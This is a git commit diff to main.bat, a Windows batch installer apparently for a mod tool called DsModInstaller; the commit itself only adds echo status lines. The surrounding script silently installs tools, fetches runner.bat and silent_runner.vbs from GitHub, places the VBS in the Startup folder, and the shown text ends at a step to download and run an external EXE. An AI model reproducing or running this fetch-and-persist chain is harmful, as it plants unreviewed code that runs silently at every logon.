25316d8611766fa8acbb51c2ceb94b17f8248d33
alfredo6686 <107364321+alfredo6686@users.noreply.github.com>
2025-03-13 14:57:10 +0100

    Update main.bat

--- main.bat
+++ main.bat
@@ -7,21 +7,27 @@ icacls "%appdata%\dsmodinstaller" /grant "%username%":F /T >nul
 echo Granted permissions to %appdata%\dsmodinstaller.
 
 :: Install Git (if missing)
+echo installing git
 where git >nul 2>nul || winget install --id Git.Git -e --silent
 
 :: Install Node.js (if missing)
+echo installing node
 where node >nul 2>nul || winget install --id OpenJS.NodeJS -e --silent
 
 :: Install cURL (if missing)
+echo installing curl
 where curl >nul 2>nul || winget install --id cURL.cURL -e --silent
 
 :: Download runner.bat from GitHub
+echo downloading runner
 curl -L -o "%appdata%\dsmodinstaller\runner.bat" "https://raw.githubusercontent.com/6686-repos/DsModInstaller/refs/heads/main/runner.bat" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/6686-repos/DsModInstaller/refs/heads/main/runner.bat" "%appdata%\dsmodinstaller\runner.bat"
 
 :: Download silent_runner.vbs from GitHub
+echo downloading silent runner
 curl -L -o "%appdata%\dsmodinstaller\silent_runner.vbs" "https://raw.githubusercontent.com/6686-repos/DsModInstaller/refs/heads/main/silent_runner.vbs" || bitsadmin /transfer job /download /priority high "https://raw.githubusercontent.com/6686-repos/DsModInstaller/refs/heads/main/silent_runner.vbs" "%appdata%\dsmodinstaller\silent_runner.vbs"
 
 :: Copy silent script to Startup folder
+echo moving files
 copy "%appdata%\dsmodinstaller\silent_runner.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
 
 :: Download and run external EXE
